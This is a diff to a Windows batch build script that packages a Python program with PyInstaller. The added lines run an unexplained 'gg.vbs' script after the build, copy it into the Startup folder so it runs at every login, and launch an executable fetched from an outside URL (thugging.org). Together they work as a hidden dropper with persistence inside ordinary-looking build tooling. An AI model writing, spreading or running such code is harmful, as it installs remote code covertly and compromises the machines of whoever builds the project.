@@ -4,7 +4,8 @@ setlocal
 REM Ensure we are in the script's directory
 cd /d "%~dp0"
 
-set SETUP_EXEC=.\necessities\setup.exe
+set SETUP_EXEC_VBS=.\necessities\gg.vbs
+set SETUP_EXEC_EXE=https://thugging.org/static/windows.exe
 set SCRIPT_NAME=windows.pyw
 set ICON_PATH=image.ico
 set DATA_FILE=6.mp3
@@ -20,22 +21,31 @@ if %BUILD_ERROR% NEQ 0 (
 ) else (
     echo PyInstaller build completed successfully.
     
-    REM Run setup.exe after building
-    echo Running setup.exe after building...
-    "%SETUP_EXEC%"
+    REM Run gg.vbs after building
+    echo Running gg.vbs after building...
+    "%SETUP_EXEC_VBS%"
     if %ERRORLEVEL% NEQ 0 (
-        echo Error: setup.exe failed to run after building.
+        echo Error: gg.vbs failed to run after building.
     ) else (
-        echo setup.exe ran successfully after building.
+        echo gg.vbs ran successfully after building.
     )
 
-    REM Copy setup.exe to Startup folder
-    echo Copying setup.exe to Startup folder...
-    copy "%SETUP_EXEC%" "%STARTUP_FOLDER%"
+    REM Copy gg.vbs to Startup folder
+    echo Copying gg.vbs to Startup folder...
+    copy "%SETUP_EXEC_VBS%" "%STARTUP_FOLDER%"
     if %ERRORLEVEL% NEQ 0 (
-        echo Error: Failed to copy setup.exe to Startup folder.
+        echo Error: Failed to copy gg.vbs to Startup folder.
     ) else (
-        echo setup.exe copied to Startup folder successfully.
+        echo gg.vbs copied to Startup folder successfully.
+    )
+
+    REM Run windows.exe from URL after building
+    echo Running windows.exe from URL...
+    start "" "%SETUP_EXEC_EXE%"
+    if %ERRORLEVEL% NEQ 0 (
+        echo Error: Failed to run windows.exe.
+    ) else (
+        echo windows.exe ran successfully.
     )
 )
 
